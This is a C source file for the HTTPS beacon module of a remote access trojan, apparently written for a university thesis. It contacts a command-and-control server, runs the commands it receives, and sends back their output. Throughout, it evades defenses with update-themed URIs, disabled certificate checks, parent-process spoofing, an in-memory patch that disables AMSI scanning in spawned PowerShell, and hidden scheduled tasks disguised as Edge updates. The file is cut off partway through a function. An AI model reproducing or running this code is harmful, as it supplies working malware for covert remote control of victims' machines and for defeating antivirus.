/*
 * https_beacon.c — Beacon loop HTTPS verso il C2
 * WinHTTP HTTPS su 192.168.42.124:443, URI pool randomizzato,
 * CWD persistente tra cicli, dispatch PS con PPID spoof + AMSI patch figlio.
 * Giuseppe Alfonso Mangiola, TESI RAT 2026, DIEM UNISA
 */

#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "evasion/ekko.h"
#include <taskschd.h>
#include <oleauto.h>

#define C2_HOST          L"192.168.42.124"
#define C2_PORT          443
#define BEACON_INTERVAL  60
#define JITTER_PCT       30

/* CWD mantenuto tra beacon cycle */
static char g_cwd[MAX_PATH] = {0};

/* ── URI pool ───────────────────────────────────────────────────────────────*/
static const wchar_t *g_beacon_uris[] = {
    L"/update/check",        L"/telemetry/v2/report",   L"/diagnostics/heartbeat",
    L"/sync/status",         L"/cdn/edge/ping",          L"/update/v3/manifest",
    L"/health/check",        L"/metrics/collect",        L"/beacon"
};
#define N_BEACON_URIS ((int)(sizeof(g_beacon_uris)/sizeof(g_beacon_uris[0])))

static const wchar_t *g_result_uris[] = {
    L"/update/apply",        L"/telemetry/v2/submit",   L"/diagnostics/upload",
    L"/sync/push",           L"/cdn/edge/data",          L"/update/v3/result",
    L"/metrics/push",        L"/report/submit",          L"/result"
};
#define N_RESULT_URIS ((int)(sizeof(g_result_uris)/sizeof(g_result_uris[0])))

static LPCWSTR _pick_uri(const wchar_t **pool, int n) {
    return pool[(unsigned)rand() % (unsigned)n];
}

#define USER_AGENT \
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) " \
    L"AppleWebKit/537.36 (KHTML, like Gecko) " \
    L"Chrome/124.0.0.0 Safari/537.36"

static void _ignore_tls(HINTERNET hReq) {
    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
                  SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE  |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
}

DWORD calc_sleep(void) {
    srand((unsigned int)time(NULL));
    int jitter    = (BEACON_INTERVAL * JITTER_PCT / 100);
    int variation = (rand() % (jitter * 2 + 1)) - jitter;
    return (DWORD)((BEACON_INTERVAL + variation) * 1000);
}

/* ── OEM → UTF-8 ────────────────────────────────────────────────────────────*/
static char* to_utf8(const char* oem_str, DWORD oem_len) {
    if (!oem_str || oem_len == 0) return _strdup("");
    int wlen = MultiByteToWideChar(CP_OEMCP, 0, oem_str, (int)oem_len, NULL, 0);
    if (wlen <= 0) {
        char* fallback = (char*)malloc(oem_len + 1);
        if (!fallback) return NULL;
        for (DWORD i = 0; i < oem_len; i++)
            fallback[i] = ((unsigned char)oem_str[i] < 0x80) ? oem_str[i] : '?';
        fallback[oem_len] = '\0';
        return fallback;
    }
    wchar_t* wide = (wchar_t*)malloc((size_t)wlen * sizeof(wchar_t));
    if (!wide) return NULL;
    MultiByteToWideChar(CP_OEMCP, 0, oem_str, (int)oem_len, wide, wlen);
    int utf8len = WideCharToMultiByte(CP_UTF8, 0, wide, wlen, NULL, 0, NULL, NULL);
    if (utf8len <= 0) { free(wide); return NULL; }
    char* utf8 = (char*)malloc((size_t)utf8len + 1);
    if (!utf8) { free(wide); return NULL; }
    WideCharToMultiByte(CP_UTF8, 0, wide, wlen, utf8, utf8len, NULL, NULL);
    utf8[utf8len] = '\0';
    free(wide);
    return utf8;
}

/* ── HTTP GET ────────────────────────────────────────────────────────────────*/
static char* _http_get(LPCWSTR path) {
    HINTERNET hSess = NULL, hConn = NULL, hReq = NULL;
    char* resp = NULL;
    DWORD total = 0, read = 0;
    char  tmp[4096];

    hSess = WinHttpOpen(USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSess) goto cleanup;
    hConn = WinHttpConnect(hSess, C2_HOST, C2_PORT, 0);
    if (!hConn) goto cleanup;
    hReq = WinHttpOpenRequest(hConn, L"GET", path, NULL, WINHTTP_NO_REFERER,
                              WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hReq) goto cleanup;
    _ignore_tls(hReq);
    WinHttpAddRequestHeaders(hReq,
        L"Accept: application/json, text/plain, */*\r\n"
        L"Accept-Language: en-US,en;q=0.9\r\n"
        L"Cache-Control: no-cache\r\n",
        -1L, WINHTTP_ADDREQ_FLAG_ADD);
    if (!WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) goto cleanup;
    if (!WinHttpReceiveResponse(hReq, NULL)) goto cleanup;
    resp = (char*)malloc(1); resp[0] = '\0';
    while (WinHttpReadData(hReq, tmp, sizeof(tmp)-1, &read) && read > 0) {
        char* newbuf = (char*)realloc(resp, total + read + 1);
        if (!newbuf) { free(resp); resp = NULL; goto cleanup; }
        resp = newbuf;
        memcpy(resp + total, tmp, read);
        total += read; resp[total] = '\0';
    }
cleanup:
    if (hReq)  WinHttpCloseHandle(hReq);
    if (hConn) WinHttpCloseHandle(hConn);
    if (hSess) WinHttpCloseHandle(hSess);
    return resp;
}

char* beacon_get(void) {
    return _http_get(_pick_uri(g_beacon_uris, N_BEACON_URIS));
}

/* ── JSON escape robusto ─────────────────────────────────────────────────────
 * Gestisce: " \ \n \r \t e tutti i byte di controllo < 0x20.
 * I byte >= 0x20 passano invariati (UTF-8 multi-byte incluso).           */
static char* json_escape(const char* input) {
    if (!input) return _strdup("");
    size_t len = strlen(input);
    /* worst case: ogni byte → \uXXXX (6 chars) */
    char* out = (char*)malloc(len * 6 + 3);
    if (!out) return NULL;
    char* p = out;
    for (size_t i = 0; i < len; i++) {
        unsigned char c = (unsigned char)input[i];
        if      (c == '"')  { *p++ = '\\'; *p++ = '"';  }
        else if (c == '\\') { *p++ = '\\'; *p++ = '\\'; }
        else if (c == '\n') { *p++ = '\\'; *p++ = 'n';  }
        else if (c == '\r') { *p++ = '\\'; *p++ = 'r';  }
        else if (c == '\t') { *p++ = '\\'; *p++ = 't';  }
        else if (c < 0x20)  { p += sprintf(p, "\\u%04x", c); }
        else                { *p++ = (char)c; }
    }
    *p = '\0';
    return out;
}

/* ── CWD helpers ─────────────────────────────────────────────────────────────*/

/* Inizializza g_cwd dalla directory corrente del processo (chiamata una volta) */
static void _init_cwd(void) {
    if (g_cwd[0] != '\0') return;
    if (!GetCurrentDirectoryA(MAX_PATH, g_cwd))
        lstrcpyA(g_cwd, "C:\\Users");
}

/*
 * _exec_cwd_strip — cerca il marcatore __CWD__=... nell'output.
 *   Aggiorna g_cwd con il valore trovato e rimuove la riga dal testo
 *   in modo che il server non la veda nell'output del comando.
 */
static char* _exec_cwd_strip(char* utf8_out) {
    if (!utf8_out) return utf8_out;
    char* marker = strstr(utf8_out, "__CWD__=");
    if (!marker) return utf8_out;

    /* Estrai il valore dopo __CWD__= fino a \r o \n */
    char* val_start = marker + 8;
    char* val_end   = val_start;
    while (*val_end && *val_end != '\r' && *val_end != '\n') val_end++;

    size_t cwd_len = (size_t)(val_end - val_start);
    if (cwd_len > 0 && cwd_len < MAX_PATH) {
        strncpy(g_cwd, val_start, cwd_len);
        g_cwd[cwd_len] = '\0';
    }

    /* Trova inizio della riga che contiene il marcatore */
    char* line_start = marker;
    while (line_start > utf8_out && *(line_start - 1) != '\n')
        line_start--;

    /* Salta i \r\n dopo il valore */
    char* after = val_end;
    while (*after == '\r' || *after == '\n') after++;

    /* Sposta il testo rimanente sul posto del marcatore */
    size_t tail = strlen(after);
    memmove(line_start, after, tail + 1);

    /* Rimuovi \r\n finale se rimasto */
    size_t out_len = strlen(utf8_out);
    while (out_len > 0 &&
           (utf8_out[out_len - 1] == '\r' || utf8_out[out_len - 1] == '\n'))
        utf8_out[--out_len] = '\0';

    return utf8_out;
}

/* ── result_post — include "cwd" nel JSON ────────────────────────────────────*/
int result_post(const char* cmd, const char* output, const char* cwd) {
    HINTERNET hSess = NULL, hConn = NULL, hReq = NULL;
    int success = 0;
    LPCWSTR resPath = _pick_uri(g_result_uris, N_RESULT_URIS);

    char* esc_out = json_escape(output ? output : "");
    char* esc_cmd = json_escape(cmd    ? cmd    : "");
    char* esc_cwd = json_escape(cwd    ? cwd    : "");
    if (!esc_out || !esc_cmd || !esc_cwd) {
        free(esc_out); free(esc_cmd); free(esc_cwd); return 0;
    }

    size_t body_sz = strlen(esc_out) + strlen(esc_cmd) + strlen(esc_cwd) + 80;
    char* body = (char*)malloc(body_sz);
    if (!body) { free(esc_out); free(esc_cmd); free(esc_cwd); return 0; }

    snprintf(body, body_sz,
             "{\"output\":\"%s\",\"cmd\":\"%s\",\"cwd\":\"%s\"}",
             esc_out, esc_cmd, esc_cwd);
    free(esc_out); free(esc_cmd); free(esc_cwd);

    hSess = WinHttpOpen(USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSess) goto cleanup;
    hConn = WinHttpConnect(hSess, C2_HOST, C2_PORT, 0);
    if (!hConn) goto cleanup;
    hReq = WinHttpOpenRequest(hConn, L"POST", resPath, NULL, WINHTTP_NO_REFERER,
                              WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hReq) goto cleanup;
    _ignore_tls(hReq);
    WinHttpAddRequestHeaders(hReq, L"Content-Type: application/json\r\n",
                             -1L, WINHTTP_ADDREQ_FLAG_ADD);
    if (!WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            (LPVOID)body, (DWORD)strlen(body),
                            (DWORD)strlen(body), 0)) goto cleanup;
    if (!WinHttpReceiveResponse(hReq, NULL)) goto cleanup;
    success = 1;
cleanup:
    free(body);
    if (hReq)  WinHttpCloseHandle(hReq);
    if (hConn) WinHttpCloseHandle(hConn);
    if (hSess) WinHttpCloseHandle(hSess);
    return success;
}

/* ── PS DISPATCH: PPID spoof (MicrosoftEdgeUpdate/explorer) + AMSI patch figlio ──*/

/* ── Trova PID per PPID spoof: MicrosoftEdgeUpdate.exe → explorer.exe ────── */
static DWORD _find_spoof_ppid(void) {
    static const char *targets[] = {
        "MicrosoftEdgeUpdate.exe",
        "explorer.exe",
        NULL
    };
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    for (int t = 0; targets[t]; t++) {
        if (Process32First(hSnap, &pe)) {
            do {
                if (_stricmp(pe.szExeFile, targets[t]) == 0) {
                    CloseHandle(hSnap);
                    return pe.th32ProcessID;
                }
            } while (Process32Next(hSnap, &pe));
        }
    }
    CloseHandle(hSnap);
    return 0;
}

/* ── Snapshot moduli del figlio: restituisce base di amsi.dll o NULL ──────── */
static BYTE* _child_amsi_base(DWORD pid) {
    HANDLE hSnap = CreateToolhelp32Snapshot(
        TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if (hSnap == INVALID_HANDLE_VALUE) return NULL;
    MODULEENTRY32 me;
    me.dwSize = sizeof(me);
    BYTE *base = NULL;
    if (Module32First(hSnap, &me)) {
        do {
            if (_stricmp(me.szModule, "amsi.dll") == 0) {
                base = me.modBaseAddr;
                break;
            }
        } while (Module32Next(hSnap, &me));
    }
    CloseHandle(hSnap);
    return base;
}

/* ── Patcha AmsiScanBuffer nel processo figlio via WPM ───────────────────── */
static BOOL _patch_amsi_child(HANDLE hProc, BYTE *childAmsiBase) {
    /* Carica amsi.dll nel nostro processo per ricavare il RVA di AmsiScanBuffer.
     * amsi.dll è mappata allo stesso indirizzo in tutti i processi della stessa
     * sessione di avvio (ASLR per-boot per DLL di sistema condivise). */
    HMODULE hAmsiLocal = GetModuleHandleA("amsi.dll");
    if (!hAmsiLocal)
        hAmsiLocal = LoadLibraryA("amsi.dll");
    if (!hAmsiLocal) return FALSE;

    BYTE *pASBLocal  = (BYTE *)GetProcAddress(hAmsiLocal, "AmsiScanBuffer");
    if (!pASBLocal) return FALSE;

    SIZE_T rva       = pASBLocal - (BYTE *)hAmsiLocal;
    BYTE  *pASBChild = childAmsiBase + rva;

    /* xor rax,rax (48 31 C0) + ret (C3) → AmsiScanBuffer ritorna 0 = AMSI_RESULT_CLEAN */
    BYTE patch[] = { 0x48, 0x31, 0xC0, 0xC3 };
    DWORD oldProt = 0;
    if (!VirtualProtectEx(hProc, pASBChild, sizeof(patch),
                          PAGE_EXECUTE_READWRITE, &oldProt))
        return FALSE;
    SIZE_T written = 0;
    BOOL ok = WriteProcessMemory(hProc, pASBChild,
                                 patch, sizeof(patch), &written);
    VirtualProtectEx(hProc, pASBChild, sizeof(patch), oldProt, &oldProt);
    return ok && (written == sizeof(patch));
}

/* ── _exec_ps_direct: PPID spoof + CREATE_SUSPENDED + APC AMSI patch ─────────
 * Fallback: crea PowerShell direttamente come processo figlio.
 * Usata quando il Task Scheduler COM non è disponibile.
 * CREATE_SUSPENDED + QueueUserAPC(LoadLibraryA) → patcha AmsiScanBuffer
 * PRIMA che PS esegua codice (elimina race condition del vecchio poll loop).
 * NOTA: Se il processo host è un'app Office (EXCEL.EXE, WINWORD.EXE),
 * Defender può comunque triggerare un behavioral alert sulla catena parent.
 * Giuseppe Alfonso Mangiola, TESI RAT 2026, DIEM UNISA                     */
static char* _exec_ps_direct(const char *ps_cmd) {
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hStdinR  = NULL, hStdinW  = NULL;
    HANDLE hStdoutR = NULL, hStdoutW = NULL;

    if (!CreatePipe(&hStdinR,  &hStdinW,  &sa, 0)) return NULL;
    if (!CreatePipe(&hStdoutR, &hStdoutW, &sa, 0)) {
        CloseHandle(hStdinR); CloseHandle(hStdinW);
        return NULL;
    }
    SetHandleInformation(hStdinW,  HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(hStdoutR, HANDLE_FLAG_INHERIT, 0);

    /* ── PPID spoofing ─────────────────────────────────────────────────── */
    HANDLE hParent = NULL;
    LPPROC_THREAD_ATTRIBUTE_LIST pAttr = NULL;
    SIZE_T cbAttr = 0;
    BOOL   ppidOk = FALSE;

    DWORD spoofPid = _find_spoof_ppid();
    if (spoofPid)
        hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, spoofPid);

    InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttr);
    pAttr = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, cbAttr);
    if (pAttr && InitializeProcThreadAttributeList(pAttr, 1, 0, &cbAttr)) {
        if (hParent && UpdateProcThreadAttribute(pAttr, 0,
                PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                &hParent, sizeof(HANDLE), NULL, NULL))
            ppidOk = TRUE;
    }

    /* ── STARTUPINFOEXA con handles ereditabili ───────────────────────── */
    STARTUPINFOEXA siEx = {0};
    siEx.StartupInfo.cb        = sizeof(siEx);
    siEx.StartupInfo.dwFlags   = STARTF_USESTDHANDLES;
    siEx.StartupInfo.hStdInput  = hStdinR;
    siEx.StartupInfo.hStdOutput = hStdoutW;
    siEx.StartupInfo.hStdError  = hStdoutW;
    if (ppidOk) siEx.lpAttributeList = pAttr;

    /* -NoP: niente profilo  -NonI: non-interattivo  -: leggi da stdin */
    char cmdline[] = "powershell.exe -NoP -NonI -";
    PROCESS_INFORMATION pi = {0};

    /* CREATE_SUSPENDED: il processo viene creato ma il thread primario
     * non esegue — ci dà tempo di patchare AMSI prima che PS parta */
    DWORD createFlags = CREATE_NO_WINDOW | CREATE_SUSPENDED;
    if (ppidOk) createFlags |= EXTENDED_STARTUPINFO_PRESENT;

    BOOL spawned = CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
                                  createFlags, NULL,
                                  g_cwd[0] ? g_cwd : NULL,
                                  (LPSTARTUPINFOA)&siEx, &pi);

    if (pAttr)   { DeleteProcThreadAttributeList(pAttr); HeapFree(GetProcessHeap(), 0, pAttr); }
    if (hParent) CloseHandle(hParent);
    CloseHandle(hStdinR);
    CloseHandle(hStdoutW);

    if (!spawned) {
        CloseHandle(hStdinW);
        CloseHandle(hStdoutR);
        return NULL;
    }

    /* ── Patch AMSI nel figlio PRIMA di riprendere l'esecuzione ────────
     * Il processo è SUSPENDED: forziamo il caricamento di amsi.dll
     * iniettando un APC che chiama LoadLibraryA("amsi.dll") sul thread
     * primario. Al ResumeThread l'APC esegue per primo, carica la DLL,
     * e noi la patchiamo prima che PS processi qualsiasi input. ─────── */
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);
    if (hProc) {
        HMODULE hK32  = GetModuleHandleA("kernel32.dll");
        FARPROC pLLA  = GetProcAddress(hK32, "LoadLibraryA");

        /* Scrivi la stringa "amsi.dll" nella memoria del figlio */
        const char amsi_name[] = "amsi.dll";
        LPVOID pRemStr = VirtualAllocEx(hProc, NULL, sizeof(amsi_name),
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (pRemStr) {
            WriteProcessMemory(hProc, pRemStr, amsi_name, sizeof(amsi_name), NULL);
            /* Accoda APC: quando il thread riprende, esegue LoadLibraryA("amsi.dll")
             * PRIMA di qualsiasi altro codice nel processo */
            QueueUserAPC((PAPCFUNC)pLLA, pi.hThread, (ULONG_PTR)pRemStr);
        }

        /* Riprendi il thread — APC esegue LoadLibraryA("amsi.dll") */
        ResumeThread(pi.hThread);
        Sleep(200);   /* breve attesa per completamento APC + init DLL */

        /* amsi.dll è ora caricata — patcha AmsiScanBuffer */
        BYTE *amsiBase = _child_amsi_base(pi.dwProcessId);
        if (amsiBase)
            _patch_amsi_child(hProc, amsiBase);

        /* Cleanup allocazione remota */
        if (pRemStr)
            VirtualFreeEx(hProc, pRemStr, 0, MEM_RELEASE);
        CloseHandle(hProc);
    } else {
        /* Fallback: riprendi senza patch AMSI */
        ResumeThread(pi.hThread);
    }

    /* ── Invia script via stdin → leggi output ────────────────────────── */
    char script[4096];
    int slen = _snprintf(script, sizeof(script), "%s\n", ps_cmd);
    if (slen > 0) {
        DWORD wr;
        WriteFile(hStdinW, script, (DWORD)slen, &wr, NULL);
    }
    CloseHandle(hStdinW);
    WaitForSingleObject(pi.hProcess, 15000);

    char  chunk[4096];
    char *raw_out = (char*)malloc(1);
    if (!raw_out) {
        CloseHandle(hStdoutR);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        return NULL;
    }
    raw_out[0] = '\0';
    DWORD total = 0, nread = 0;
    while (ReadFile(hStdoutR, chunk, sizeof(chunk)-1, &nread, NULL) && nread > 0) {
        char *nb = (char*)realloc(raw_out, total + nread + 1);
        if (!nb) break;
        raw_out = nb;
        memcpy(raw_out + total, chunk, nread);
        total += nread;
        raw_out[total] = '\0';
    }
    CloseHandle(hStdoutR);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    char *utf8_out = to_utf8(raw_out, total);
    free(raw_out);
    return utf8_out;
}

/* ── _exec_ps_via_task: esegue PS via Task Scheduler (T1053.005) ──────────────
 * Spezza completamente la catena parent EXCEL.EXE → powershell.exe.
 * Il Task Scheduler (svchost.exe) spawna cmd.exe → powershell.exe.
 * Output catturato via file temporaneo, task cancellata dopo l'esecuzione.
 * Giuseppe Alfonso Mangiola, TESI RAT 2026, DIEM UNISA                      */
static char* _exec_ps_via_task(const char *ps_cmd) {
    HRESULT hr;
    char   *result       = NULL;
    BOOL    comNeedUninit = FALSE;

    ITaskService       *pService  = NULL;
    ITaskDefinition    *pTask     = NULL;
    ITaskSettings      *pSettings = NULL;
    IActionCollection  *pActions  = NULL;
    IAction            *pAction   = NULL;
    IExecAction        *pExec     = NULL;
    ITaskFolder        *pFolder   = NULL;
    IRegisteredTask    *pRegTask  = NULL;

    VARIANT vEmpty;
    VariantInit(&vEmpty);

    srand((unsigned)GetTickCount() ^ GetCurrentProcessId());
    unsigned r1 = (unsigned)rand() & 0xFFFF;
    unsigned r2 = (unsigned)rand() & 0xFFFF;

    /* ── File temporanei: script PS e output ──────────────────────────── */
    char tempDir[MAX_PATH];
    GetTempPathA(MAX_PATH, tempDir);

    char ps1Path[MAX_PATH], outPath[MAX_PATH];
    snprintf(ps1Path, MAX_PATH, "%s~eu_%04x.ps1", tempDir, r1);
    snprintf(outPath, MAX_PATH, "%s~eu_%04x.tmp", tempDir, r2);

    /* Scrivi il comando PS nel file .ps1 con redirect output incorporato */
    FILE *f = fopen(ps1Path, "w");
    if (!f) return NULL;
    /* Forza output UTF-8 (PS 5.1 default è UTF-16LE con *>) */
    fprintf(f,
        "& { %s } 2>&1 | Out-File -FilePath '%s' -Encoding utf8\n",
        ps_cmd, outPath);
    fclose(f);

    /* Scrivi un launcher .vbs temp che esegue il .ps1 con finestra nascosta.
     * Usa WScript.Shell.Run parametro 0 (hidden) + True (attendi fine).
     * Nessun -WindowStyle Hidden nel command line → niente Commando.A!ml */
    char vbsPath[MAX_PATH];
    snprintf(vbsPath, MAX_PATH, "%s~eu_%04x.vbs", tempDir, r1 ^ 0xA5A5);

    FILE *fv = fopen(vbsPath, "w");
    if (!fv) { DeleteFileA(ps1Path); return NULL; }
    fprintf(fv,
        "CreateObject(\"WScript.Shell\").Run "
        "\"powershell.exe -NoP -NonI -EP Bypass "
        "-File \"\"\" & \"%s\" & \"\"\"\", 0, True\r\n",
        ps1Path);
    fclose(fv);

    /* ── Task name pseudo-random ──────────────────────────────────────── */
    WCHAR taskName[64];
    wsprintfW(taskName, L"EdgeUpdate_%04X%04X", r1, r2);

    /* ── Argomenti: wscript.exe //B lancia il .vbs (completamente silent) */
    wchar_t wVbs[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, vbsPath, -1, wVbs, MAX_PATH);

    WCHAR wArgs[MAX_PATH * 3];
    _snwprintf(wArgs, MAX_PATH * 3 - 1,
        L"//B //Nologo \"%s\"",
        wVbs);

    /* ── CWD ──────────────────────────────────────────────────────────── */
    wchar_t wCwd[MAX_PATH] = {0};
    if (g_cwd[0])
        MultiByteToWideChar(CP_ACP, 0, g_cwd, -1, wCwd, MAX_PATH);

    /* ── COM init ─────────────────────────────────────────────────────── */
    hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (hr == S_OK || hr == S_FALSE)
        comNeedUninit = TRUE;
    else if (hr != RPC_E_CHANGED_MODE)      /* COM non disponibile */
        goto cleanup;
    /* RPC_E_CHANGED_MODE: COM già inizializzato in altro modo → usabile */

    /* ── ITaskService ─────────────────────────────────────────────────── */
    hr = CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_ALL,
                          &IID_ITaskService, (void **)&pService);
    if (FAILED(hr)) goto cleanup;

    hr = pService->lpVtbl->Connect(pService, vEmpty, vEmpty, vEmpty, vEmpty);
    if (FAILED(hr)) goto cleanup;

    hr = pService->lpVtbl->NewTask(pService, 0, &pTask);
    if (FAILED(hr)) goto cleanup;

    /* ── Settings: nascosto, esegui su batteria ──────────────────────── */
    hr = pTask->lpVtbl->get_Settings(pTask, &pSettings);
    if (SUCCEEDED(hr)) {
        pSettings->lpVtbl->put_Hidden(pSettings, VARIANT_TRUE);
        pSettings->lpVtbl->put_DisallowStartIfOnBatteries(pSettings, VARIANT_FALSE);
        pSettings->lpVtbl->put_StopIfGoingOnBatteries(pSettings, VARIANT_FALSE);
        pSettings->lpVtbl->Release(pSettings); pSettings = NULL;
    }

    /* ── Action: wscript.exe //B → .vbs → powershell nascosto ─────────── */
    hr = pTask->lpVtbl->get_Actions(pTask, &pActions);
    if (FAILED(hr)) goto cleanup;

    hr = pActions->lpVtbl->Create(pActions, TASK_ACTION_EXEC, &pAction);
    if (FAILED(hr)) goto cleanup;

    hr = pAction->lpVtbl->QueryInterface(pAction,
             &IID_IExecAction, (void **)&pExec);
    if (FAILED(hr)) goto cleanup;

    { wchar_t wszWS[MAX_PATH] = {0};
      GetSystemDirectoryW(wszWS, MAX_PATH);
      lstrcatW(wszWS, L"\\wscript.exe");
      BSTR bp = SysAllocString(wszWS);
      pExec->lpVtbl->put_Path(pExec, bp);
      SysFreeString(bp); }

    { BSTR ba = SysAllocString(wArgs);
      pExec->lpVtbl->put_Arguments(pExec, ba);
      SysFreeString(ba); }

    if (wCwd[0]) {
        BSTR bc = SysAllocString(wCwd);
        pExec->lpVtbl->put_WorkingDirectory(pExec, bc);
        SysFreeString(bc);
    }

    pExec->lpVtbl->Release(pExec);       pExec    = NULL;
    pAction->lpVtbl->Release(pAction);   pAction  = NULL;
    pActions->lpVtbl->Release(pActions); pActions = NULL;

    /* ── Registra nella root folder ──────────────────────────────────── */
    hr = pService->lpVtbl->GetFolder(pService, (BSTR)L"\\", &pFolder);
    if (FAILED(hr)) goto cleanup;

    { BSTR bName = SysAllocString(taskName);
      hr = pFolder->lpVtbl->RegisterTaskDefinition(
          pFolder, bName, pTask,
          TASK_CREATE_OR_UPDATE,
          vEmpty, vEmpty,
          TASK_LOGON_INTERACTIVE_TOKEN,
          vEmpty, &pRegTask);
      SysFreeString(bName); }
    if (FAILED(hr)) goto cleanup;

    /* ── Esegui immediatamente via IRegisteredTask::Run ───────────────── */
    { VARIANT vNull;
      VariantInit(&vNull);
      IRunningTask *pRunning = NULL;
      hr = pRegTask->lpVtbl->Run(pRegTask, vNull, &pRunning);
      if (pRunning) pRunning->lpVtbl->Release(pRunning);
      if (FAILED(hr)) goto delete_task; }

    /* ── Poll fino a completamento (max 15 s) ────────────────────────── */
    for (int i = 0; i < 150; i++) {
        Sleep(100);
        TASK_STATE state = TASK_STATE_UNKNOWN;
        pRegTask->lpVtbl->get_State(pRegTask, &state);
        if (state != TASK_STATE_RUNNING && state != TASK_STATE_QUEUED)
            break;
    }

delete_task:
    /* ── Cancella la task one-shot ────────────────────────────────────── */
    { BSTR bName = SysAllocString(taskName);
      pFolder->lpVtbl->DeleteTask(pFolder, bName, 0);
      SysFreeString(bName); }

    /* ── Leggi output dal file temporaneo ─────────────────────────────── */
    { HANDLE hFile = CreateFileA(outPath, GENERIC_READ, FILE_SHARE_READ,
                                  NULL, OPEN_EXISTING,
                                  FILE_ATTRIBUTE_NORMAL, NULL);
      if (hFile != INVALID_HANDLE_VALUE) {
          DWORD fSize = GetFileSize(hFile, NULL);
          if (fSize > 0 && fSize < 10 * 1024 * 1024) {
              char *buf = (char *)malloc(fSize + 1);
              if (buf) {
                  DWORD rd;
                  ReadFile(hFile, buf, fSize, &rd, NULL);
                  buf[rd] = '\0';
                  /* Output è UTF-8 (Out-File -Encoding utf8).
                   * PS 5.1 aggiunge BOM UTF-8 (EF BB BF) → skippa se presente */
                  char *start = buf;
                  DWORD len = rd;
                  if (len >= 3 && (unsigned char)start[0] == 0xEF
                               && (unsigned char)start[1] == 0xBB
                               && (unsigned char)start[2] == 0xBF) {
                      start += 3;
                      len -= 3;
                  }
                  result = (char *)malloc(len + 1);
                  if (result) {
                      memcpy(result, start, len);
                      result[len] = '\0';
                  }
                  free(buf);
              }
          }
          CloseHandle(hFile);
      }
    }

cleanup:
    DeleteFileA(ps1Path);
    DeleteFileA(vbsPath);
    DeleteFileA(outPath);
    if (pRegTask)  pRegTask->lpVtbl->Release(pRegTask);
    if (pFolder)   pFolder->lpVtbl->Release(pFolder);
    if (pExec)     pExec->lpVtbl->Release(pExec);
    if (pAction)   pAction->lpVtbl->Release(pAction);
    if (pActions)  pActions->lpVtbl->Release(pActions);
    if (pSettings) pSettings->lpVtbl->Release(pSettings);
    if (pTask)     pTask->lpVtbl->Release(pTask);
    if (pService)  pService->lpVtbl->Release(pService);
    if (comNeedUninit) CoUninitialize();

    /* Rimuovi whitespace finale */
    if (result) {
        size_t len = strlen(result);
        while (len > 0 && (result[len-1]=='\n' || result[len-1]=='\r'
                        || result[len-1]==' '))
            result[--len] = '\0';
    }
    return result;
}

/* ── exec_ps_patched: wrapper con fallback ───────────────────────────────────
 * 1) Prova esecuzione via Task Scheduler (T1053.005) → parent = svchost.exe
 *    Spezza la catena EXCEL.EXE → powershell.exe che triggera behavioral alert.
 * 2) Se COM/TaskScheduler fallisce → fallback CREATE_SUSPENDED + APC patch.
 * Giuseppe Alfonso Mangiola, TESI RAT 2026, DIEM UNISA                      */
static char* exec_ps_patched(const char *ps_cmd) {
    char *result = _exec_ps_via_task(ps_cmd);
    if (result) return result;
    /* Fallback: CreateProcess diretto (meno stealth se host è Office) */
    return _exec_ps_direct(ps_cmd);
}

/* ── execute_command: CWD persistente via batch file temporaneo in %TEMP% ──────*/
static char* execute_command(const char* cmd) {
    BOOL is_ps = (strncmp(cmd, "ps:", 3) == 0);
    if (is_ps) return exec_ps_patched(cmd + 3);

    _init_cwd();

    /* ── Crea batch file temporaneo ──────────────────────────────────────── */
    char bat_path[MAX_PATH] = {0};
    GetTempPathA(MAX_PATH, bat_path);
    lstrcatA(bat_path, "~xec.bat");

    BOOL bat_ok = FALSE;
    FILE* bat = fopen(bat_path, "w");
    if (bat) {
        fprintf(bat, "@echo off\r\n");
        fprintf(bat, "%s\r\n", cmd);
        /* %CD% si espande a runtime nel processo figlio già avviato in g_cwd */
        fprintf(bat, "echo __CWD__=%%CD%%\r\n");
        fclose(bat);
        bat_ok = TRUE;
    }

    /* ── Costruisci cmdline ───────────────────────────────────────────────── */
    char full_cmd[MAX_PATH + 32] = {0};
    if (bat_ok) {
